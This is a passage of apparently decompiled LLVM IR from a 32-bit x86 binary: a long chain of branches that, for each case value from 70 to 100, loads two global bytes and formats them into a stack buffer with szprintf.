  store i32 %v2_804adc8, i32* @ebx, align 4
  %v4_804adda = call i32 @szprintf(i32 %v2_804adc8, i32 ptrtoint ([13 x i8]* @global_var_8058c95.109 to i32), i32 %v1_804adb9)
  br label %dec_label_pc_804addf

dec_label_pc_804addf:                             ; preds = %dec_label_pc_804ada9, %dec_label_pc_804adaf
  %v13_804addf = icmp eq i32 %v2_8049efa, 70
  %v1_804ade3 = icmp eq i1 %v13_804addf, false
  br i1 %v1_804ade3, label %dec_label_pc_804ae15, label %dec_label_pc_804ade5

dec_label_pc_804ade5:                             ; preds = %dec_label_pc_804addf
  %v0_804ade5 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ade5 = zext i8 %v0_804ade5 to i32
  store i32 %v1_804ade5, i32* @edx, align 4
  %v0_804adef = load i8, i8* @global_var_805c539.40, align 1
  %v1_804adef = zext i8 %v0_804adef to i32
  %v2_804adfe = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adfe, i32* @ebx, align 4
  %v4_804ae10 = call i32 @szprintf(i32 %v2_804adfe, i32 ptrtoint ([13 x i8]* @global_var_8058ca2.110 to i32), i32 %v1_804adef)
  br label %dec_label_pc_804ae15

dec_label_pc_804ae15:                             ; preds = %dec_label_pc_804addf, %dec_label_pc_804ade5
  %v13_804ae15 = icmp eq i32 %v2_8049efa, 71
  %v1_804ae19 = icmp eq i1 %v13_804ae15, false
  br i1 %v1_804ae19, label %dec_label_pc_804ae4b, label %dec_label_pc_804ae1b

dec_label_pc_804ae1b:                             ; preds = %dec_label_pc_804ae15
  %v0_804ae1b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ae1b = zext i8 %v0_804ae1b to i32
  store i32 %v1_804ae1b, i32* @edx, align 4
  %v0_804ae25 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ae25 = zext i8 %v0_804ae25 to i32
  %v2_804ae34 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae34, i32* @ebx, align 4
  %v4_804ae46 = call i32 @szprintf(i32 %v2_804ae34, i32 ptrtoint ([13 x i8]* @global_var_8058caf.111 to i32), i32 %v1_804ae25)
  br label %dec_label_pc_804ae4b

dec_label_pc_804ae4b:                             ; preds = %dec_label_pc_804ae15, %dec_label_pc_804ae1b
  %v13_804ae4b = icmp eq i32 %v2_8049efa, 72
  %v1_804ae4f = icmp eq i1 %v13_804ae4b, false
  br i1 %v1_804ae4f, label %dec_label_pc_804ae81, label %dec_label_pc_804ae51

dec_label_pc_804ae51:                             ; preds = %dec_label_pc_804ae4b
  %v0_804ae51 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ae51 = zext i8 %v0_804ae51 to i32
  store i32 %v1_804ae51, i32* @edx, align 4
  %v0_804ae5b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ae5b = zext i8 %v0_804ae5b to i32
  %v2_804ae6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae6a, i32* @ebx, align 4
  %v4_804ae7c = call i32 @szprintf(i32 %v2_804ae6a, i32 ptrtoint ([13 x i8]* @global_var_8058cbc.112 to i32), i32 %v1_804ae5b)
  br label %dec_label_pc_804ae81

dec_label_pc_804ae81:                             ; preds = %dec_label_pc_804ae4b, %dec_label_pc_804ae51
  %v13_804ae81 = icmp eq i32 %v2_8049efa, 73
  %v1_804ae85 = icmp eq i1 %v13_804ae81, false
  br i1 %v1_804ae85, label %dec_label_pc_804aeb7, label %dec_label_pc_804ae87

dec_label_pc_804ae87:                             ; preds = %dec_label_pc_804ae81
  %v0_804ae87 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ae87 = zext i8 %v0_804ae87 to i32
  store i32 %v1_804ae87, i32* @edx, align 4
  %v0_804ae91 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ae91 = zext i8 %v0_804ae91 to i32
  %v2_804aea0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aea0, i32* @ebx, align 4
  %v4_804aeb2 = call i32 @szprintf(i32 %v2_804aea0, i32 ptrtoint ([13 x i8]* @global_var_8058cc9.113 to i32), i32 %v1_804ae91)
  br label %dec_label_pc_804aeb7

dec_label_pc_804aeb7:                             ; preds = %dec_label_pc_804ae81, %dec_label_pc_804ae87
  %v13_804aeb7 = icmp eq i32 %v2_8049efa, 74
  %v1_804aebb = icmp eq i1 %v13_804aeb7, false
  br i1 %v1_804aebb, label %dec_label_pc_804aeed, label %dec_label_pc_804aebd

dec_label_pc_804aebd:                             ; preds = %dec_label_pc_804aeb7
  %v0_804aebd = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804aebd = zext i8 %v0_804aebd to i32
  store i32 %v1_804aebd, i32* @edx, align 4
  %v0_804aec7 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804aec7 = zext i8 %v0_804aec7 to i32
  %v2_804aed6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aed6, i32* @ebx, align 4
  %v4_804aee8 = call i32 @szprintf(i32 %v2_804aed6, i32 ptrtoint ([13 x i8]* @global_var_8058cd6.114 to i32), i32 %v1_804aec7)
  br label %dec_label_pc_804aeed

dec_label_pc_804aeed:                             ; preds = %dec_label_pc_804aeb7, %dec_label_pc_804aebd
  %v13_804aeed = icmp eq i32 %v2_8049efa, 75
  %v1_804aef1 = icmp eq i1 %v13_804aeed, false
  br i1 %v1_804aef1, label %dec_label_pc_804af23, label %dec_label_pc_804aef3

dec_label_pc_804aef3:                             ; preds = %dec_label_pc_804aeed
  %v0_804aef3 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804aef3 = zext i8 %v0_804aef3 to i32
  store i32 %v1_804aef3, i32* @edx, align 4
  %v0_804aefd = load i8, i8* @global_var_805c539.40, align 1
  %v1_804aefd = zext i8 %v0_804aefd to i32
  %v2_804af0c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af0c, i32* @ebx, align 4
  %v4_804af1e = call i32 @szprintf(i32 %v2_804af0c, i32 ptrtoint ([13 x i8]* @global_var_8058ce3.115 to i32), i32 %v1_804aefd)
  br label %dec_label_pc_804af23

dec_label_pc_804af23:                             ; preds = %dec_label_pc_804aeed, %dec_label_pc_804aef3
  %v13_804af23 = icmp eq i32 %v2_8049efa, 76
  %v1_804af27 = icmp eq i1 %v13_804af23, false
  br i1 %v1_804af27, label %dec_label_pc_804af59, label %dec_label_pc_804af29

dec_label_pc_804af29:                             ; preds = %dec_label_pc_804af23
  %v0_804af29 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804af29 = zext i8 %v0_804af29 to i32
  store i32 %v1_804af29, i32* @edx, align 4
  %v0_804af33 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804af33 = zext i8 %v0_804af33 to i32
  %v2_804af42 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af42, i32* @ebx, align 4
  %v4_804af54 = call i32 @szprintf(i32 %v2_804af42, i32 ptrtoint ([13 x i8]* @global_var_8058cf0.116 to i32), i32 %v1_804af33)
  br label %dec_label_pc_804af59

dec_label_pc_804af59:                             ; preds = %dec_label_pc_804af23, %dec_label_pc_804af29
  %v13_804af59 = icmp eq i32 %v2_8049efa, 77
  %v1_804af5d = icmp eq i1 %v13_804af59, false
  br i1 %v1_804af5d, label %dec_label_pc_804af8f, label %dec_label_pc_804af5f

dec_label_pc_804af5f:                             ; preds = %dec_label_pc_804af59
  %v0_804af5f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804af5f = zext i8 %v0_804af5f to i32
  store i32 %v1_804af5f, i32* @edx, align 4
  %v0_804af69 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804af69 = zext i8 %v0_804af69 to i32
  %v2_804af78 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af78, i32* @ebx, align 4
  %v4_804af8a = call i32 @szprintf(i32 %v2_804af78, i32 ptrtoint ([13 x i8]* @global_var_8058cfd.117 to i32), i32 %v1_804af69)
  br label %dec_label_pc_804af8f

dec_label_pc_804af8f:                             ; preds = %dec_label_pc_804af59, %dec_label_pc_804af5f
  %v13_804af8f = icmp eq i32 %v2_8049efa, 78
  %v1_804af93 = icmp eq i1 %v13_804af8f, false
  br i1 %v1_804af93, label %dec_label_pc_804afc5, label %dec_label_pc_804af95

dec_label_pc_804af95:                             ; preds = %dec_label_pc_804af8f
  %v0_804af95 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804af95 = zext i8 %v0_804af95 to i32
  store i32 %v1_804af95, i32* @edx, align 4
  %v0_804af9f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804af9f = zext i8 %v0_804af9f to i32
  %v2_804afae = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afae, i32* @ebx, align 4
  %v4_804afc0 = call i32 @szprintf(i32 %v2_804afae, i32 ptrtoint ([13 x i8]* @global_var_8058d0a.118 to i32), i32 %v1_804af9f)
  br label %dec_label_pc_804afc5

dec_label_pc_804afc5:                             ; preds = %dec_label_pc_804af8f, %dec_label_pc_804af95
  %v13_804afc5 = icmp eq i32 %v2_8049efa, 79
  %v1_804afc9 = icmp eq i1 %v13_804afc5, false
  br i1 %v1_804afc9, label %dec_label_pc_804affb, label %dec_label_pc_804afcb

dec_label_pc_804afcb:                             ; preds = %dec_label_pc_804afc5
  %v0_804afcb = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804afcb = zext i8 %v0_804afcb to i32
  store i32 %v1_804afcb, i32* @edx, align 4
  %v0_804afd5 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804afd5 = zext i8 %v0_804afd5 to i32
  %v2_804afe4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afe4, i32* @ebx, align 4
  %v4_804aff6 = call i32 @szprintf(i32 %v2_804afe4, i32 ptrtoint ([13 x i8]* @global_var_8058d17.119 to i32), i32 %v1_804afd5)
  br label %dec_label_pc_804affb

dec_label_pc_804affb:                             ; preds = %dec_label_pc_804afc5, %dec_label_pc_804afcb
  %v10_804affb = icmp eq i32 %v2_8049efa, 80
  %v1_804afff = icmp eq i1 %v10_804affb, false
  br i1 %v1_804afff, label %dec_label_pc_804b031, label %dec_label_pc_804b001

dec_label_pc_804b001:                             ; preds = %dec_label_pc_804affb
  %v0_804b001 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b001 = zext i8 %v0_804b001 to i32
  store i32 %v1_804b001, i32* @edx, align 4
  %v0_804b00b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b00b = zext i8 %v0_804b00b to i32
  %v2_804b01a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b01a, i32* @ebx, align 4
  %v4_804b02c = call i32 @szprintf(i32 %v2_804b01a, i32 ptrtoint ([13 x i8]* @global_var_8058d24.120 to i32), i32 %v1_804b00b)
  br label %dec_label_pc_804b031

dec_label_pc_804b031:                             ; preds = %dec_label_pc_804affb, %dec_label_pc_804b001
  %v13_804b031 = icmp eq i32 %v2_8049efa, 81
  %v1_804b035 = icmp eq i1 %v13_804b031, false
  br i1 %v1_804b035, label %dec_label_pc_804b067, label %dec_label_pc_804b037

dec_label_pc_804b037:                             ; preds = %dec_label_pc_804b031
  %v0_804b037 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b037 = zext i8 %v0_804b037 to i32
  store i32 %v1_804b037, i32* @edx, align 4
  %v0_804b041 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b041 = zext i8 %v0_804b041 to i32
  %v2_804b050 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b050, i32* @ebx, align 4
  %v4_804b062 = call i32 @szprintf(i32 %v2_804b050, i32 ptrtoint ([13 x i8]* @global_var_8058d31.121 to i32), i32 %v1_804b041)
  br label %dec_label_pc_804b067

dec_label_pc_804b067:                             ; preds = %dec_label_pc_804b031, %dec_label_pc_804b037
  %v13_804b067 = icmp eq i32 %v2_8049efa, 82
  %v1_804b06b = icmp eq i1 %v13_804b067, false
  br i1 %v1_804b06b, label %dec_label_pc_804b09d, label %dec_label_pc_804b06d

dec_label_pc_804b06d:                             ; preds = %dec_label_pc_804b067
  %v0_804b06d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b06d = zext i8 %v0_804b06d to i32
  store i32 %v1_804b06d, i32* @edx, align 4
  %v0_804b077 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b077 = zext i8 %v0_804b077 to i32
  %v2_804b086 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b086, i32* @ebx, align 4
  %v4_804b098 = call i32 @szprintf(i32 %v2_804b086, i32 ptrtoint ([13 x i8]* @global_var_8058d3e.122 to i32), i32 %v1_804b077)
  br label %dec_label_pc_804b09d

dec_label_pc_804b09d:                             ; preds = %dec_label_pc_804b067, %dec_label_pc_804b06d
  %v13_804b09d = icmp eq i32 %v2_8049efa, 83
  %v1_804b0a1 = icmp eq i1 %v13_804b09d, false
  br i1 %v1_804b0a1, label %dec_label_pc_804b0d3, label %dec_label_pc_804b0a3

dec_label_pc_804b0a3:                             ; preds = %dec_label_pc_804b09d
  %v0_804b0a3 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b0a3 = zext i8 %v0_804b0a3 to i32
  store i32 %v1_804b0a3, i32* @edx, align 4
  %v0_804b0ad = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b0ad = zext i8 %v0_804b0ad to i32
  %v2_804b0bc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0bc, i32* @ebx, align 4
  %v4_804b0ce = call i32 @szprintf(i32 %v2_804b0bc, i32 ptrtoint ([13 x i8]* @global_var_8058d4b.123 to i32), i32 %v1_804b0ad)
  br label %dec_label_pc_804b0d3

dec_label_pc_804b0d3:                             ; preds = %dec_label_pc_804b09d, %dec_label_pc_804b0a3
  %v13_804b0d3 = icmp eq i32 %v2_8049efa, 84
  %v1_804b0d7 = icmp eq i1 %v13_804b0d3, false
  br i1 %v1_804b0d7, label %dec_label_pc_804b109, label %dec_label_pc_804b0d9

dec_label_pc_804b0d9:                             ; preds = %dec_label_pc_804b0d3
  %v0_804b0d9 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b0d9 = zext i8 %v0_804b0d9 to i32
  store i32 %v1_804b0d9, i32* @edx, align 4
  %v0_804b0e3 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b0e3 = zext i8 %v0_804b0e3 to i32
  %v2_804b0f2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0f2, i32* @ebx, align 4
  %v4_804b104 = call i32 @szprintf(i32 %v2_804b0f2, i32 ptrtoint ([13 x i8]* @global_var_8058d58.124 to i32), i32 %v1_804b0e3)
  br label %dec_label_pc_804b109

dec_label_pc_804b109:                             ; preds = %dec_label_pc_804b0d3, %dec_label_pc_804b0d9
  %v13_804b109 = icmp eq i32 %v2_8049efa, 85
  %v1_804b10d = icmp eq i1 %v13_804b109, false
  br i1 %v1_804b10d, label %dec_label_pc_804b13f, label %dec_label_pc_804b10f

dec_label_pc_804b10f:                             ; preds = %dec_label_pc_804b109
  %v0_804b10f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b10f = zext i8 %v0_804b10f to i32
  store i32 %v1_804b10f, i32* @edx, align 4
  %v0_804b119 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b119 = zext i8 %v0_804b119 to i32
  %v2_804b128 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b128, i32* @ebx, align 4
  %v4_804b13a = call i32 @szprintf(i32 %v2_804b128, i32 ptrtoint ([13 x i8]* @global_var_8058d65.125 to i32), i32 %v1_804b119)
  br label %dec_label_pc_804b13f

dec_label_pc_804b13f:                             ; preds = %dec_label_pc_804b109, %dec_label_pc_804b10f
  %v13_804b13f = icmp eq i32 %v2_8049efa, 86
  %v1_804b143 = icmp eq i1 %v13_804b13f, false
  br i1 %v1_804b143, label %dec_label_pc_804b175, label %dec_label_pc_804b145

dec_label_pc_804b145:                             ; preds = %dec_label_pc_804b13f
  %v0_804b145 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b145 = zext i8 %v0_804b145 to i32
  store i32 %v1_804b145, i32* @edx, align 4
  %v0_804b14f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b14f = zext i8 %v0_804b14f to i32
  %v2_804b15e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b15e, i32* @ebx, align 4
  %v4_804b170 = call i32 @szprintf(i32 %v2_804b15e, i32 ptrtoint ([13 x i8]* @global_var_8058d72.126 to i32), i32 %v1_804b14f)
  br label %dec_label_pc_804b175

dec_label_pc_804b175:                             ; preds = %dec_label_pc_804b13f, %dec_label_pc_804b145
  %v13_804b175 = icmp eq i32 %v2_8049efa, 87
  %v1_804b179 = icmp eq i1 %v13_804b175, false
  br i1 %v1_804b179, label %dec_label_pc_804b1ab, label %dec_label_pc_804b17b

dec_label_pc_804b17b:                             ; preds = %dec_label_pc_804b175
  %v0_804b17b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b17b = zext i8 %v0_804b17b to i32
  store i32 %v1_804b17b, i32* @edx, align 4
  %v0_804b185 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b185 = zext i8 %v0_804b185 to i32
  %v2_804b194 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b194, i32* @ebx, align 4
  %v4_804b1a6 = call i32 @szprintf(i32 %v2_804b194, i32 ptrtoint ([13 x i8]* @global_var_8058d7f.127 to i32), i32 %v1_804b185)
  br label %dec_label_pc_804b1ab

dec_label_pc_804b1ab:                             ; preds = %dec_label_pc_804b175, %dec_label_pc_804b17b
  %v13_804b1ab = icmp eq i32 %v2_8049efa, 88
  %v1_804b1af = icmp eq i1 %v13_804b1ab, false
  br i1 %v1_804b1af, label %dec_label_pc_804b1e1, label %dec_label_pc_804b1b1

dec_label_pc_804b1b1:                             ; preds = %dec_label_pc_804b1ab
  %v0_804b1b1 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b1b1 = zext i8 %v0_804b1b1 to i32
  store i32 %v1_804b1b1, i32* @edx, align 4
  %v0_804b1bb = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b1bb = zext i8 %v0_804b1bb to i32
  %v2_804b1ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1ca, i32* @ebx, align 4
  %v4_804b1dc = call i32 @szprintf(i32 %v2_804b1ca, i32 ptrtoint ([13 x i8]* @global_var_8058d8c.128 to i32), i32 %v1_804b1bb)
  br label %dec_label_pc_804b1e1

dec_label_pc_804b1e1:                             ; preds = %dec_label_pc_804b1ab, %dec_label_pc_804b1b1
  %v13_804b1e1 = icmp eq i32 %v2_8049efa, 89
  %v1_804b1e5 = icmp eq i1 %v13_804b1e1, false
  br i1 %v1_804b1e5, label %dec_label_pc_804b217, label %dec_label_pc_804b1e7

dec_label_pc_804b1e7:                             ; preds = %dec_label_pc_804b1e1
  %v0_804b1e7 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b1e7 = zext i8 %v0_804b1e7 to i32
  store i32 %v1_804b1e7, i32* @edx, align 4
  %v0_804b1f1 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b1f1 = zext i8 %v0_804b1f1 to i32
  %v2_804b200 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b200, i32* @ebx, align 4
  %v4_804b212 = call i32 @szprintf(i32 %v2_804b200, i32 ptrtoint ([13 x i8]* @global_var_8058d99.129 to i32), i32 %v1_804b1f1)
  br label %dec_label_pc_804b217

dec_label_pc_804b217:                             ; preds = %dec_label_pc_804b1e1, %dec_label_pc_804b1e7
  %v13_804b217 = icmp eq i32 %v2_8049efa, 90
  %v1_804b21b = icmp eq i1 %v13_804b217, false
  br i1 %v1_804b21b, label %dec_label_pc_804b24d, label %dec_label_pc_804b21d

dec_label_pc_804b21d:                             ; preds = %dec_label_pc_804b217
  %v0_804b21d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b21d = zext i8 %v0_804b21d to i32
  store i32 %v1_804b21d, i32* @edx, align 4
  %v0_804b227 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b227 = zext i8 %v0_804b227 to i32
  %v2_804b236 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b236, i32* @ebx, align 4
  %v4_804b248 = call i32 @szprintf(i32 %v2_804b236, i32 ptrtoint ([13 x i8]* @global_var_8058da6.130 to i32), i32 %v1_804b227)
  br label %dec_label_pc_804b24d

dec_label_pc_804b24d:                             ; preds = %dec_label_pc_804b217, %dec_label_pc_804b21d
  %v13_804b24d = icmp eq i32 %v2_8049efa, 91
  %v1_804b251 = icmp eq i1 %v13_804b24d, false
  br i1 %v1_804b251, label %dec_label_pc_804b283, label %dec_label_pc_804b253

dec_label_pc_804b253:                             ; preds = %dec_label_pc_804b24d
  %v0_804b253 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b253 = zext i8 %v0_804b253 to i32
  store i32 %v1_804b253, i32* @edx, align 4
  %v0_804b25d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b25d = zext i8 %v0_804b25d to i32
  %v2_804b26c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b26c, i32* @ebx, align 4
  %v4_804b27e = call i32 @szprintf(i32 %v2_804b26c, i32 ptrtoint ([13 x i8]* @global_var_8058db3.131 to i32), i32 %v1_804b25d)
  br label %dec_label_pc_804b283

dec_label_pc_804b283:                             ; preds = %dec_label_pc_804b24d, %dec_label_pc_804b253
  %v13_804b283 = icmp eq i32 %v2_8049efa, 92
  %v1_804b287 = icmp eq i1 %v13_804b283, false
  br i1 %v1_804b287, label %dec_label_pc_804b2b9, label %dec_label_pc_804b289

dec_label_pc_804b289:                             ; preds = %dec_label_pc_804b283
  %v0_804b289 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b289 = zext i8 %v0_804b289 to i32
  store i32 %v1_804b289, i32* @edx, align 4
  %v0_804b293 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b293 = zext i8 %v0_804b293 to i32
  %v2_804b2a2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2a2, i32* @ebx, align 4
  %v4_804b2b4 = call i32 @szprintf(i32 %v2_804b2a2, i32 ptrtoint ([13 x i8]* @global_var_8058dc0.132 to i32), i32 %v1_804b293)
  br label %dec_label_pc_804b2b9

dec_label_pc_804b2b9:                             ; preds = %dec_label_pc_804b283, %dec_label_pc_804b289
  %v13_804b2b9 = icmp eq i32 %v2_8049efa, 93
  %v1_804b2bd = icmp eq i1 %v13_804b2b9, false
  br i1 %v1_804b2bd, label %dec_label_pc_804b2ef, label %dec_label_pc_804b2bf

dec_label_pc_804b2bf:                             ; preds = %dec_label_pc_804b2b9
  %v0_804b2bf = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b2bf = zext i8 %v0_804b2bf to i32
  store i32 %v1_804b2bf, i32* @edx, align 4
  %v0_804b2c9 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b2c9 = zext i8 %v0_804b2c9 to i32
  %v2_804b2d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2d8, i32* @ebx, align 4
  %v4_804b2ea = call i32 @szprintf(i32 %v2_804b2d8, i32 ptrtoint ([13 x i8]* @global_var_8058dcd.133 to i32), i32 %v1_804b2c9)
  br label %dec_label_pc_804b2ef

dec_label_pc_804b2ef:                             ; preds = %dec_label_pc_804b2b9, %dec_label_pc_804b2bf
  %v13_804b2ef = icmp eq i32 %v2_8049efa, 94
  %v1_804b2f3 = icmp eq i1 %v13_804b2ef, false
  br i1 %v1_804b2f3, label %dec_label_pc_804b325, label %dec_label_pc_804b2f5

dec_label_pc_804b2f5:                             ; preds = %dec_label_pc_804b2ef
  %v0_804b2f5 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b2f5 = zext i8 %v0_804b2f5 to i32
  store i32 %v1_804b2f5, i32* @edx, align 4
  %v0_804b2ff = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b2ff = zext i8 %v0_804b2ff to i32
  %v2_804b30e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b30e, i32* @ebx, align 4
  %v4_804b320 = call i32 @szprintf(i32 %v2_804b30e, i32 ptrtoint ([13 x i8]* @global_var_8058b3f.83 to i32), i32 %v1_804b2ff)
  br label %dec_label_pc_804b325

dec_label_pc_804b325:                             ; preds = %dec_label_pc_804b2ef, %dec_label_pc_804b2f5
  %v13_804b325 = icmp eq i32 %v2_8049efa, 95
  %v1_804b329 = icmp eq i1 %v13_804b325, false
  br i1 %v1_804b329, label %dec_label_pc_804b35b, label %dec_label_pc_804b32b

dec_label_pc_804b32b:                             ; preds = %dec_label_pc_804b325
  %v0_804b32b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b32b = zext i8 %v0_804b32b to i32
  store i32 %v1_804b32b, i32* @edx, align 4
  %v0_804b335 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b335 = zext i8 %v0_804b335 to i32
  %v2_804b344 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b344, i32* @ebx, align 4
  %v4_804b356 = call i32 @szprintf(i32 %v2_804b344, i32 ptrtoint ([13 x i8]* @global_var_8058dda.134 to i32), i32 %v1_804b335)
  br label %dec_label_pc_804b35b

dec_label_pc_804b35b:                             ; preds = %dec_label_pc_804b325, %dec_label_pc_804b32b
  %v10_804b35b = icmp eq i32 %v2_8049efa, 96
  %v1_804b35f = icmp eq i1 %v10_804b35b, false
  br i1 %v1_804b35f, label %dec_label_pc_804b391, label %dec_label_pc_804b361

dec_label_pc_804b361:                             ; preds = %dec_label_pc_804b35b
  %v0_804b361 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b361 = zext i8 %v0_804b361 to i32
  store i32 %v1_804b361, i32* @edx, align 4
  %v0_804b36b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b36b = zext i8 %v0_804b36b to i32
  %v2_804b37a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b37a, i32* @ebx, align 4
  %v4_804b38c = call i32 @szprintf(i32 %v2_804b37a, i32 ptrtoint ([13 x i8]* @global_var_8058b66.86 to i32), i32 %v1_804b36b)
  br label %dec_label_pc_804b391

dec_label_pc_804b391:                             ; preds = %dec_label_pc_804b35b, %dec_label_pc_804b361
  %v13_804b391 = icmp eq i32 %v2_8049efa, 97
  %v1_804b395 = icmp eq i1 %v13_804b391, false
  br i1 %v1_804b395, label %dec_label_pc_804b3c7, label %dec_label_pc_804b397

dec_label_pc_804b397:                             ; preds = %dec_label_pc_804b391
  %v0_804b397 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b397 = zext i8 %v0_804b397 to i32
  store i32 %v1_804b397, i32* @edx, align 4
  %v0_804b3a1 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b3a1 = zext i8 %v0_804b3a1 to i32
  %v2_804b3b0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3b0, i32* @ebx, align 4
  %v4_804b3c2 = call i32 @szprintf(i32 %v2_804b3b0, i32 ptrtoint ([13 x i8]* @global_var_8058de7.135 to i32), i32 %v1_804b3a1)
  br label %dec_label_pc_804b3c7

dec_label_pc_804b3c7:                             ; preds = %dec_label_pc_804b391, %dec_label_pc_804b397
  %v13_804b3c7 = icmp eq i32 %v2_8049efa, 98
  %v1_804b3cb = icmp eq i1 %v13_804b3c7, false
  br i1 %v1_804b3cb, label %dec_label_pc_804b3fd, label %dec_label_pc_804b3cd

dec_label_pc_804b3cd:                             ; preds = %dec_label_pc_804b3c7
  %v0_804b3cd = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b3cd = zext i8 %v0_804b3cd to i32
  store i32 %v1_804b3cd, i32* @edx, align 4
  %v0_804b3d7 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b3d7 = zext i8 %v0_804b3d7 to i32
  %v2_804b3e6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3e6, i32* @ebx, align 4
  %v4_804b3f8 = call i32 @szprintf(i32 %v2_804b3e6, i32 ptrtoint ([13 x i8]* @global_var_8058df4.136 to i32), i32 %v1_804b3d7)
  br label %dec_label_pc_804b3fd

dec_label_pc_804b3fd:                             ; preds = %dec_label_pc_804b3c7, %dec_label_pc_804b3cd
  %v13_804b3fd = icmp eq i32 %v2_8049efa, 99
  %v1_804b401 = icmp eq i1 %v13_804b3fd, false
  br i1 %v1_804b401, label %dec_label_pc_804b433, label %dec_label_pc_804b403

dec_label_pc_804b403:                             ; preds = %dec_label_pc_804b3fd
  %v0_804b403 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b403 = zext i8 %v0_804b403 to i32
  store i32 %v1_804b403, i32* @edx, align 4
  %v0_804b40d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b40d = zext i8 %v0_804b40d to i32
  %v2_804b41c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b41c, i32* @ebx, align 4
  %v4_804b42e = call i32 @szprintf(i32 %v2_804b41c, i32 ptrtoint ([13 x i8]* @global_var_8058e01.137 to i32), i32 %v1_804b40d)
  br label %dec_label_pc_804b433

dec_label_pc_804b433:                             ; preds = %dec_label_pc_804b3fd, %dec_label_pc_804b403
  %v13_804b433 = icmp eq i32 %v2_8049efa, 100
  %v1_804b437 = icmp eq i1 %v13_804b433, false
  br i1 %v1_804b437, label %dec_label_pc_804b469, label %dec_label_pc_804b439

dec_label_pc_804b439:                             ; preds = %dec_label_pc_804b433
  %v0_804b439 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b439 = zext i8 %v0_804b439 to i32
